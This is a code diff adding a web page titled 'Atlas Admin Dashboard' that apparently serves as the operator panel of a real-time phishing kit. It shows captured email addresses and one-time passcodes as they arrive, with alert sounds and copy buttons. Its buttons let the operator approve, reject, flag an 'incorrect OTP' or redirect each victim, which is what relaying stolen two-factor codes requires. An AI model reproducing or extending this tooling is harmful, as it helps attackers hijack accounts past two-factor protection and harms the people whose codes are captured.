@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Atlas Admin Dashboard</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,sans-serif}
+    body{background:#f3f4f6;padding:20px}
+    .container{max-width:1400px;margin:0 auto}
+    .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;flex-wrap:wrap;gap:16px}
+    h1{font-size:24px;font-weight:700;color:#1f2937}
+    .logout-btn{padding:10px 20px;background:#ef4444;color:white;border:none;border-radius:50px;cursor:pointer}
+    .stats{display:flex;gap:16px;margin-bottom:24px;flex-wrap:wrap}
+    .stat-card{background:white;border-radius:16px;padding:16px 24px;flex:1;min-width:120px;box-shadow:0 1px 3px rgba(0,0,0,0.05)}
+    .stat-card h3{font-size:13px;color:#6b7280;margin-bottom:8px}
+    .stat-card .number{font-size:28px;font-weight:700;color:#1f2937}
+    .table-container{background:white;border-radius:20px;overflow-x:auto;box-shadow:0 1px 3px rgba(0,0,0,0.05)}
+    table{width:100%;border-collapse:collapse;min-width:800px}
+    th{text-align:left;padding:16px;background:#f9fafb;font-weight:600;font-size:13px;color:#6b7280;border-bottom:1px solid #e5e7eb}
+    td{padding:14px 16px;border-bottom:1px solid #f0f0f0;font-size:14px;color:#374151}
+    tr:hover{background:#f9fafb}
+    .copy-btn{background:none;border:none;cursor:pointer;color:#9ca3af;margin-left:8px}
+    .copy-btn:hover{color:#4a4ff0}
+    .status-badge{display:inline-block;padding:4px 10px;border-radius:30px;font-size:12px;font-weight:500}
+    .status-pending{background:#fef3c7;color:#d97706}
+    .status-approved{background:#d1fae5;color:#059669}
+    .status-otp_submitted{background:#e0e7ff;color:#4f46e5}
+    .status-redirected{background:#fee2e2;color:#dc2626}
+    .status-rejected{background:#f3f4f6;color:#6b7280}
+    .action-group{display:flex;gap:8px;flex-wrap:wrap}
+    .action-btn{padding:6px 12px;border-radius:8px;font-size:12px;font-weight:500;border:none;cursor:pointer}
+    .btn-approve{background:#059669;color:white}
+    .btn-reject{background:#6b7280;color:white}
+    .btn-incorrect{background:#e11d48;color:white}
+    .btn-redirect{background:#3b82f6;color:white}
+  </style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <h1>Atlas Admin Dashboard</h1>
+    <button class="logout-btn" id="logoutBtn">Logout</button>
+  </div>
+  <div class="stats">
+    <div class="stat-card"><h3>Total Users</h3><div class="number" id="totalUsers">0</div></div>
+    <div class="stat-card"><h3>Pending Email</h3><div class="number" id="pendingEmails">0</div></div>
+    <div class="stat-card"><h3>OTP Submitted</h3><div class="number" id="otpSubmitted">0</div></div>
+  </div>
+  <div class="table-container">
+    <table>
+      <thead><tr><th>ID</th><th>Email</th><th>OTP Code</th><th>Status</th><th>Created</th><th>Actions</th></tr></thead>
+      <tbody id="usersTable"></tbody>
+    </table>
+  </div>
+</div>
+<script src="/socket.io/socket.io.js"></script>
+<script>
+  const token = localStorage.getItem('adminToken');
+  if (!token) window.location.href = '/admin/index.html';
+
+  const socket = io();
+
+  // Audio elements
+  const emailSound = new Audio('/sounds/email.mp3');
+  const otpSound = new Audio('/sounds/otp.mp3');
+
+  let users = [];
+
+  async function loadUsers() {
+    try {
+      const res = await fetch('/api/users');
+      users = await res.json();
+      renderTable();
+      updateStats();
+    } catch (err) {}
+  }
+
+  function renderTable() {
+    const tbody = document.getElementById('usersTable');
+    tbody.innerHTML = users.map(user => `
+      <tr>
+        <td>${user.id}</td>
+        <td>${escapeHtml(user.email)} <button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.email)}')">📋</button></td>
+        <td>${user.otp_code ? escapeHtml(user.otp_code) : '-'} ${user.otp_code ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.otp_code)}')">📋</button>` : ''}</td>
+        <td><span class="status-badge status-${user.status}">${user.status}</span></td>
+        <td>${new Date(user.created_at).toLocaleString()}</td>
+        <td class="action-group">
+          ${user.status === 'pending' ? `<button class="action-btn btn-approve" onclick="actionUser('approve','${user.email}')">Approve</button>
+             <button class="action-btn btn-reject" onclick="actionUser('reject','${user.email}')">Reject</button>` : ''}
+          ${user.status === 'otp_submitted' ? `<button class="action-btn btn-incorrect" onclick="actionUser('incorrect-otp','${user.email}')">Incorrect OTP</button>
+             <button class="action-btn btn-redirect" onclick="actionUser('redirect','${user.email}')">Redirect</button>` : ''}
+        </td>
+      </tr>
+    `).join('');
+  }
+
+  function updateStats() {
+    document.getElementById('totalUsers').innerText = users.length;
+    document.getElementById('pendingEmails').innerText = users.filter(u => u.status === 'pending').length;
+    document.getElementById('otpSubmitted').innerText = users.filter(u => u.status === 'otp_submitted').length;
+  }
+
+  async function actionUser(action, email) {
+    try {
+      await fetch(`/api/admin/${action}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email })
+      });
+      loadUsers();
+    } catch (err) {}
+  }
+
+  function copyToClipboard(text) {
+    navigator.clipboard.writeText(text);
+  }
+
+  function escapeHtml(str) {
+    if (!str) return '';
+    return str.replace(/[&<>]/g, function(m) {
+      if (m === '&') return '&amp;';
+      if (m === '<') return '&lt;';
+      if (m === '>') return '&gt;';
+      return m;
+    });
+  }
+
+  // Socket events
+  socket.on('new-email', () => {
+    emailSound.play();
+    loadUsers();
+  });
+  socket.on('new-otp', () => {
+    otpSound.play();
+    loadUsers();
+  });
+  socket.on('approve-user', () => loadUsers());
+  socket.on('reject-user', () => loadUsers());
+  socket.on('incorrect-otp', () => loadUsers());
+  socket.on('redirect-to-sad', () => loadUsers());
+
+  document.getElementById('logoutBtn').addEventListener('click', () => {
+    localStorage.removeItem('adminToken');
+    window.location.href = '/admin/index.html';
+  });
+
+  loadUsers();
+  setInterval(loadUsers, 5000);
+</script>
+</body>
+</html>
